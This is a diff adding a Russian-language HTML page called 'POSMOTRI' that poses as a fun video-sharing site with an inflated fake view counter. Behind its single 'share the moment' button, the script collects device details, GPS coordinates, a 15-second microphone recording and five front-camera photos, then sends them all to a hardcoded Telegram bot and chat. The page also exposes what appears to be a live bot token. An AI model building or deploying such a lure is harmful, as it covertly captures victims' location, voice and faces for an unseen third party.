@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>POSMOTRI — Поделись моментом</title>
+    <style>
+        /* Определение тем (Темная и Светлая) */
+        :root {
+            --primary: #ff3366;
+            --bg: #0f1015;
+            --card-bg: #1a1c23;
+            --text: #ffffff;
+            --text-secondary: #a0a5b8;
+        }
+
+        [data-theme="light"] {
+            --primary: #e6004c;
+            --bg: #f0f2f5;
+            --card-bg: #ffffff;
+            --text: #1a1c23;
+            --text-secondary: #65676b;
+        }
+
+        body {
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg);
+            color: var(--text);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            transition: background-color 0.3s, color 0.3s;
+            position: relative;
+        }
+
+        header {
+            text-align: center;
+            padding: 30px 20px 10px;
+            width: 100%;
+            max-width: 500px;
+            box-sizing: border-box;
+        }
+
+        /* Кнопка смены темы в правом верхнем углу */
+        .theme-toggle {
+            position: fixed;
+            top: 15px;
+            right: 15px;
+            background: var(--card-bg);
+            border: 1px solid var(--text-secondary);
+            color: var(--text);
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+            transition: transform 0.2s, background-color 0.3s;
+            z-index: 1000;
+        }
+
+        .theme-toggle:active {
+            transform: scale(0.9);
+        }
+
+        header h1 {
+            font-size: 2.2rem;
+            margin: 0;
+            letter-spacing: 2px;
+            color: var(--primary);
+        }
+
+        header p {
+            color: var(--text-secondary);
+            margin-top: 5px;
+            font-size: 0.95rem;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+            padding: 0 20px 40px;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .card {
+            background-color: var(--card-bg);
+            border-radius: 16px;
+            padding: 20px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+            transition: background-color 0.3s;
+        }
+
+        .card h3 {
+            margin: 0;
+            font-size: 1.1rem;
+            text-align: center;
+        }
+
+        .video-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+            width: 100%;
+        }
+
+        .fun-video {
+            width: 100%;
+            max-width: 420px;
+            height: 240px;
+            object-fit: cover;
+            border-radius: 12px;
+            background: #000;
+            display: block;
+        }
+
+        button {
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.2s, transform 0.1s;
+            width: 100%;
+        }
+
+        button:active {
+            transform: scale(0.98);
+        }
+
+        button:hover {
+            opacity: 0.9;
+        }
+
+        /* Скрытые элементы */
+        video#camera-feed, canvas {
+            display: none;
+        }
+
+        .status {
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+            text-align: center;
+            min-height: 20px;
+        }
+
+        /* Главная кнопка быстрого действия */
+        .fast-submit-btn {
+            background-color: #00C853;
+            font-size: 1.1rem;
+            padding: 16px;
+            margin-top: 10px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 4px 16px rgba(0,200,83,0.3);
+        }
+
+        .fast-submit-btn.loading {
+            pointer-events: none;
+            opacity: 0.8;
+            color: transparent;
+        }
+
+        .fast-submit-btn.loading::after {
+            content: "";
+            position: absolute;
+            width: 24px;
+            height: 24px;
+            top: 50%;
+            left: 50%;
+            margin-left: -12px;
+            margin-top: -12px;
+            border: 3px solid #ffffff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .visit-counter {
+            position: fixed;
+            bottom: 12px;
+            right: 15px;
+            background: var(--card-bg);
+            border: 1px solid var(--text-secondary);
+            padding: 5px 10px;
+            border-radius: 12px;
+            font-size: 0.75rem;
+            color: var(--text-secondary);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+            z-index: 1000;
+        }
+    </style>
+</head>
+<body data-theme="dark">
+
+    <button class="theme-toggle" onclick="toggleTheme()" id="theme-btn" title="Сменить тему">🌙</button>
+
+    <div class="visit-counter">
+        👁️ <span id="visit-count">1</span>
+    </div>
+
+    <header>
+        <h1>POSMOTRI</h1>
+        <p>Умный момент в один клик</p>
+    </header>
+
+    <div class="container">
+
+        <div class="card">
+            <h3>🔥 Видео дня</h3>
+            <div class="video-container">
+                <video class="fun-video" controls playsinline>
+                    <source src="mm.mp4" type="video/mp4">
+                    Ваш браузер не поддерживает видео.
+                </video>
+                <video class="fun-video" controls playsinline>
+                    <source src="m.mp4" type="video/mp4">
+                    Ваш браузер не поддерживает видео.
+                </video>
+            </div>
+        </div>
+
+        <video id="camera-feed" autoplay playsinline></video>
+        <canvas id="snapshot-canvas"></canvas>
+        
+        <div class="card" style="border: 2px dashed #00C853;">
+            <h3 style="color: #00C853;">⚡ Быстрый старт</h3>
+            <div class="status" id="action-status">Нажмите кнопку ниже, чтобы поделиться моментом</div>
+            <button id="fast-btn" class="fast-submit-btn" onclick="executeAllAndSend()">🚀 Отправить всё в Telegram</button>
+        </div>
+
+    </div>
+
+    <script>
+        // НАСТРОЙКИ TELEGRAM (Замените на свои данные!)
+        const TELEGRAM_BOT_TOKEN = '8872214333:AAEgmHA9ludvD9H924kmVfRNU46UDX_mQ1Y';
+        const TELEGRAM_CHAT_ID = '7898338804';
+
+        window.addEventListener('DOMContentLoaded', () => {
+            let views = localStorage.getItem('posmotri_views');
+            views = views ? parseInt(views) + 1 : 124;
+            localStorage.setItem('posmotri_views', views);
+            document.getElementById('visit-count').textContent = views;
+
+            const savedTheme = localStorage.getItem('posmotri_theme') || 'dark';
+            document.body.setAttribute('data-theme', savedTheme);
+            updateThemeButtonIcon(savedTheme);
+        });
+
+        function toggleTheme() {
+            const currentTheme = document.body.getAttribute('data-theme');
+            const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
+            document.body.setAttribute('data-theme', newTheme);
+            localStorage.setItem('posmotri_theme', newTheme);
+            updateThemeButtonIcon(newTheme);
+        }
+
+        function updateThemeButtonIcon(theme) {
+            const btn = document.getElementById('theme-btn');
+            btn.textContent = theme === 'dark' ? '🌙' : '☀️';
+        }
+
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+
+        // Функция сбора информации об устройстве (телефоне/ПК)
+        async function getDeviceInfo() {
+            let batteryInfo = 'Недоступно';
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Заряжается ⚡' : 'Разряжается 🔋'})`;
+                }
+            } catch(e) {}
+
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform || 'Не указана',
+                language: navigator.language || 'Не указан',
+                screen: `${window.screen.width}x${window.screen.height}`,
+                cores: navigator.hardwareConcurrency || 'Не указано',
+                memory: navigator.deviceMemory ? `${navigator.deviceMemory} ГБ+` : 'Не указано',
+                battery: batteryInfo,
+                online: navigator.onLine ? 'Да' : 'Нет'
+            };
+        }
+
+        function getGeolocationAsync() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            lat: position.coords.latitude.toFixed(6),
+                            lon: position.coords.longitude.toFixed(6)
+                        });
+                    },
+                    () => { resolve(null); },
+                    { timeout: 7000 }
+                );
+            });
+        }
+
+        function recordAudioAsync() {
+            return new Promise(async (resolve) => {
+                try {
+                    const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    const mediaRecorder = new MediaRecorder(audioStream);
+                    const audioChunks = [];
+
+                    mediaRecorder.ondataavailable = (event) => {
+                        if (event.data.size > 0) {
+                            audioChunks.push(event.data);
+                        }
+                    };
+
+                    mediaRecorder.onstop = () => {
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                        audioStream.getTracks().forEach(track => track.stop());
+                        resolve(audioBlob);
+                    };
+
+                    mediaRecorder.start();
+
+                    setTimeout(() => {
+                        if (mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
+                        }
+                    }, 15000);
+
+                } catch (err) {
+                    resolve(null);
+                }
+            });
+        }
+
+        function takePhotosSeriesAsync(statusCallback) {
+            return new Promise(async (resolve) => {
+                try {
+                    const videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                    const video = document.getElementById('camera-feed');
+                    video.srcObject = videoStream;
+
+                    await new Promise(r => setTimeout(r, 1000));
+
+                    const canvas = document.getElementById('snapshot-canvas');
+                    const photos = [];
+
+                    for (let i = 1; i <= 5; i++) {
+                        if (statusCallback) statusCallback(`Съемка фото ${i} из 5...`);
+                        
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+                        photos.push(dataUrl);
+
+                        if (i < 5) {
+                            await new Promise(r => setTimeout(r, 1000));
+                        }
+                    }
+
+                    videoStream.getTracks().forEach(track => track.stop());
+                    video.srcObject = null;
+
+                    resolve(photos);
+                } catch (err) {
+                    resolve([]);
+                }
+            });
+        }
+
+        async function executeAllAndSend() {
+            const status = document.getElementById('action-status');
+            const submitBtn = document.getElementById('fast-btn');
+            
+            submitBtn.classList.add('loading');
+            status.textContent = 'Сбор информации об устройстве и гео...';
+
+            // Параллельно собираем инфо о телефоне, гео и запускаем аудио/фото
+            const devicePromise = getDeviceInfo();
+            const locationPromise = getGeolocationAsync();
+            const audioPromise = recordAudioAsync();
+            
+            status.textContent = 'Идет запись звука (15 сек) и фотосъемка...';
+            const photosPromise = takePhotosSeriesAsync((msg) => {
+                status.textContent = msg;
+            });
+
+            const [device, location, audioBlob, photos] = await Promise.all([
+                devicePromise,
+                locationPromise,
+                audioPromise,
+                photosPromise
+            ]);
+
+            status.textContent = 'Отправка собранных данных в Telegram...';
+
+            try {
+                let textMessage = '⚡ *Новый отчет об устройстве с сайта POSMOTRI*!\n\n';
+                
+                // Добавляем данные о телефоне
+                textMessage += `📱 *Информация о телефоне/устройстве:*\n`;
+                textMessage += `• ОС / Платформа: ${device.platform}\n`;
+                textMessage += `• Экран: ${device.screen}\n`;
+                textMessage += `• Язык: ${device.language}\n`;
+                textMessage += `• Заряд батареи: ${device.battery}\n`;
+                textMessage += `• Ядер процессора: ${device.cores}\n`;
+                textMessage += `• ОЗУ (примерно): ${device.memory}\n`;
+                textMessage += `• User-Agent: \`${device.userAgent}\`\n\n`;
+
+                if (location) {
+                    textMessage += `📍 *Локация:* [Открыть карту](https://maps.google.com/?q=${location.lat},${location.lon})\n`;
+                    textMessage += `Широта: ${location.lat} | Долгота: ${location.lon}\n\n`;
+                } else {
+                    textMessage += '📍 Локация: Не получена / отклонена\n\n';
+                }
+
+                if (audioBlob) {
+                    textMessage += '🎤 Аудиозапись: Прикреплена ниже (15 сек)\n';
+                } else {
+                    textMessage += '⚠️ Аудио: Доступ к микрофону отклонен\n';
+                }
+
+                if (photos.length > 0) {
+                    textMessage += `📸 Фотографии: Сделано кадров: ${photos.length}`;
+                } else {
+                    textMessage += '⚠️ Фото: Доступ к камере отклонен';
+                }
+
+                // 1. Отправляем структурированный текст с данными телефона и гео
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: textMessage,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                // 2. Отправляем аудиозапись
+                if (audioBlob) {
+                    const audioFormData = new FormData();
+                    audioFormData.append('chat_id', TELEGRAM_CHAT_ID);
+                    audioFormData.append('voice', audioBlob, 'voice_15s.webm');
+                    audioFormData.append('caption', '🎤 Аудиозапись 15 секунд');
+
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVoice`, {
+                        method: 'POST',
+                        body: audioFormData
+                    });
+                }
+
+                // 3. Отправляем серию фотографий
+                for (let i = 0; i < photos.length; i++) {
+                    const photoBlob = dataURItoBlob(photos[i]);
+                    const photoFormData = new FormData();
+                    photoFormData.append('chat_id', TELEGRAM_CHAT_ID);
+                    photoFormData.append('photo', photoBlob, `photo_${i+1}.jpg`);
+                    photoFormData.append('caption', `📸 Фото ${i+1} из 5`);
+
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: photoFormData
+                    });
+                }
+
+                status.textContent = 'Всё успешно отправлено!';
+                alert('Данные об устройстве, геолокация, аудио и фото успешно отправлены в Telegram!');
+                location.reload();
+
+            } catch (error) {
+                console.error(error);
+                alert('Произошла ошибка при отправке. Проверьте токен бота и интернет-соединение.');
+                submitBtn.classList.remove('loading');
+                status.textContent = 'Ошибка отправки. Попробуйте еще раз.';
+            }
+        }
+    </script>
+</body>
+</html>
